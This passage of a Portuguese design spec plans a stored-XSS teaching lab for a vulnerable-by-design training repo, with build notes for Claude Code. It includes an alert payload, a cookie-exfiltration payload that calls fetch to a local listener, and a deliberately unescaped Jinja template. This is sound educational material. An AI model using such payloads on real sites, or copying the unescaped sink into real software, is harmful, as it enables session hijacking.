| Cookie de sessão | `session=fake-session-token-abc123`, **não-HttpOnly**, em **ambas** as versões | Alvo concreto pro roubo (análogo ao `wonderland`). Não-HttpOnly senão `document.cookie` não lê. Não é o bug; o sink é. Fixed mantém o cookie (app.py idêntico). |
| `app.py` vulnerable × fixed | **Idêntico byte a byte** | O bug vive **só no template** (como no 02). Toda a diferença é o `\|safe`. |
| Payload Step 1 | `<script>alert(document.domain)</script>` | Mesmo payload do Step 3 do reflected → contraste "mesmo payload, entrega diferente". `document.domain` mostra a origin (`127.0.0.1:8008`). |
| Payload Step 3 | `<script>fetch('http://127.0.0.1:9000/?c='+document.cookie)</script>` | Exfil tangível via listener stdlib. `http://127.0.0.1` (lab local). Ensina técnica de pentest reutilizável. |
| Nº de steps | **3** (plant→fire / persistência / roubo de cookie); **sem** filtro/bypass | Foca no conceito stored limpo. Filtro contradiz o sink `\|safe` puro e diluiria o foco. Reflected também é filter-free. |
| Listener | `python3 -m http.server 9000` (terminal separado) | Stdlib, auto-contido, rodado pelo aluno. Técnica real de captura de callback/OOB. |
| Divisão de ferramentas | **Burp planta (principal) + browser observa (obrigatório)**; trilha secundária = form no browser | Burp não executa JS → browser obrigatório pra ver disparar. A divisão espelha o split atacante/vítima. |
| Fix | Autoescape do Jinja (dropar `\|safe`); HttpOnly só como defense-in-depth no DIFF | Mesma defesa do reflected. HttpOnly limita o roubo de cookie mas **não** é o fix nem para o XSS; fixed não o adiciona (uma variável só muda). |

---

## Open questions — status após sign-off do mantenedor

Spec **aprovada**. Status de cada item:

**Confirmadas (defaults mantidos):**

1. **Texto do Theory primer** — confirmado: **"Stored cross-site scripting (XSS)"** (paralelo ao 02, fiel à frase de abertura da PortSwigger), embora o H1 literal da página seja "Stored XSS".
3. **Sink único no `body`, `author` escapado** — confirmado. Fix de uma linha.
4. **3 steps, sem passo de filtro/bypass** — confirmado. Foco no conceito stored puro.

**Ajustadas pelo mantenedor (incorporadas nesta revisão):**

5. **Exibir `created_at` na lista (AJUSTE — incorporado).** Deixa de ser display-only opcional: o timestamp **deve** aparecer na lista, em formato discreto (ex.: `alice &middot; 2026-06-21`), **escapado** (nunca sink). Motivos: (a) realismo do guestbook — recado datado parece feature real, e o realismo reforça "a vítima visita uma página legítima"; (b) reforça a persistência do Step 2 — timestamps visíveis tornam tangível que os recados ficaram salvos ao longo do tempo. Incorporado no Schema (seed com datas passadas explícitas; `DEFAULT (date('now'))`), na seção HTML, no esboço do template e nos dois diffs. Coube dentro do limite de 40 linhas do HTML (nada precisou ser cortado).
6. **Registrar a exceção Burp/browser no CLAUDE.md (AJUSTE — incorporado): SIM.** É **convenção de projeto**, não do átomo 08: o futuro `xss-dom` (átomo 21, Fase 5) terá o mesmo problema (XSS, browser obrigatório), então registrar uma vez no CLAUDE.md evita reinventar a discussão por átomo. A alteração do CLAUDE.md é um **commit SEPARADO** na fase de geração, **isolado dos arquivos do átomo** — ver a nota dedicada em "Notas específicas pro Claude Code".

**Pendente, não-bloqueante:**

2. **Porta do listener (9000).** O mantenedor vai confirmar que está livre no setup dele antes de fixar no walkthrough; se conflitar, troca por **9001** ou **8888**. Manter `9000` na spec como provisório e pinar o valor final na geração (análogo ao K do átomo 07). Não bloqueia o início da geração, mas o walkthrough só é finalizado com a porta confirmada.

**Bloqueante remanescente:** nenhuma. Resta só a confirmação da porta 9000 e o sign-off do commit da spec.

---

## Notas específicas pro Claude Code

- **Princípio guia:** este átomo é o **par do reflected**. Cada parágrafo do walkthrough deve poder ser lido com o `xss-reflected` aberto ao lado, e a diferença ("aqui o payload persiste e a vítima é outra pessoa") deve estar visível na linha em discussão. O sink, o fix e a forma do DIFF são deliberadamente quase idênticos ao 02 — o que é novo é **persistência + vítima de terceiros**, não o mecanismo.
- **Leitura obrigatória antes de gerar (CLAUDE.md §10.5):** `xss-reflected` inteiro (irmão; reusar a forma do sink `|safe`, do fix, do aside de DOM-based XSS, da nota source→sink cross-file) e `sqli-blind-time` (formato atualizado de README/WALKTHROUGH/DIFF, `docker-compose.yml`, `Dockerfile`, blocos decoded/Burp-ready).
- **`app.py` idêntico em vulnerable e fixed.** O bug é **só** o `|safe` no template. Não introduzir diferença de código entre as duas versões.
- **INSERT parametrizado** (`?`) no `POST /comment` — armazenar o payload **não** é o bug; **não há SQLi**. Não concatenar input no SQL.
- **Cookie não-HttpOnly nas duas versões** (padrão do `set_cookie`, com comentário explicando). Não escrever `httponly=False` explícito. Não adicionar HttpOnly na versão fixed (HttpOnly entra só como discussão de defense-in-depth no DIFF).
- **O browser é obrigatório** para observar a execução. **Não** fazer este átomo Burp-only. Burp = plantar (principal); browser = observar/vítima (obrigatório). Trilha secundária opcional = plantar pelo form no browser.
- **Exceção Burp/browser no CLAUDE.md — commit SEPARADO na geração (sign-off do mantenedor).** Esta é **convenção de projeto**, não do átomo 08: registrá-la uma vez beneficia todos os átomos client-side futuros (que, como este, exigem browser para provar a execução — ex.: o futuro `xss-dom`). Fazer um commit **isolado dos arquivos do átomo**, com a mensagem exatamente `docs(claude): note browser-mandatory exception for client-side execution atoms`. Conteúdo, em resumo: Burp é a ferramenta primária da maioria dos átomos, mas vulnerabilidades cuja **prova exige execução de JavaScript no browser** (XSS, e futuramente outras classes client-side) usam o browser como parte **OBRIGATÓRIA da trilha principal** — Burp para plantar/manipular requests, browser para observar a execução; a trilha secundária opcional (sem Burp) continua existindo. Articular no §3.3 (ou onde melhor couber na estrutura atual do CLAUDE.md). **Não** misturar essa alteração com os arquivos do átomo no mesmo commit.
- **Nota de encoding do corpo** no walkthrough: form-urlencoded; `+`→`%2B` (literal `+` vira espaço!), `&`/`=`/`<`/`>`/`'` encodados no valor; atalho Ctrl+U. Reusar a forma decoded/Burp-ready do 06/07. O `+` só morde no Burp; pelo form do browser o encoding é automático.
- **Cross-atom reference policy:** OK referenciar `xss-reflected`, `sqli-union-basic`, `sqli-blind-boolean`, `sqli-blind-time` (todos em `main`). **Proibido** referenciar `xss-dom`, `command-injection-basic`, `ssti-jinja` ou qualquer átomo da Fase 2+ ainda não publicado. Ao falar de DOM-based XSS ou de SSTI, **generalizar a lição** (ou linkar PortSwigger), **nunca** nomear o átomo futuro.
- **Bilíngue PT+EN no mesmo commit** (README, WALKTHROUGH, DIFF), padrão v0.1.0. H1 do `README.md` e `README.pt-BR.md` **idêntico**: `# xss-stored — Stored Cross-Site Scripting`.
- **Theory primer obrigatório** no topo do `README.md` e `README.pt-BR.md`, linkando `https://portswigger.net/web-security/cross-site-scripting/stored` com o texto `Stored cross-site scripting (XSS)` preservado em inglês também no PT.
- **`docker-compose.yml`:** `127.0.0.1:8008:5000` (vulnerable), `127.0.0.1:8108:5000` (fixed). Reaproveitar o esqueleto do 02/07.
- **Sem volume mount** no compose: os comentários plantados vivem enquanto o container roda (demonstra persistência); `./atom down` + `up` reseta ao seed. DBs de vulnerable e fixed são independentes.
- **CHANGELOG.md:** ao gerar o átomo (não agora), adicionar em `[Unreleased] / Added`: `Added atom 08: \`xss-stored\` — Stored Cross-Site Scripting (A03 Injection).` (mesmo padrão das linhas dos átomos 06/07).
- **ROADMAP.md:** marcar o átomo 08 como `[x]` **só na geração+validação** (proposta ao mantenedor, CLAUDE.md §10.4). **Não** alterar ROADMAP nesta fase de spec.
- **Validar manualmente os 3 steps** na versão vulnerable (alert dispara no `GET /` após plantar via POST; persistência ao recarregar; cookie chega no listener) e a falha na versão fixed (payloads aparecem como **texto literal** na tela, nada executa, listener silencioso). Conferir que o cookie existe já na **primeira** visita (Set-Cookie antes do body).
- Se houver dúvida sobre o nome exato de uma aba/tab do Burp na versão atual, **perguntar antes de inventar** (CLAUDE.md). Este átomo usa pouco do Burp (só Repeater pro POST) — sem Intruder.
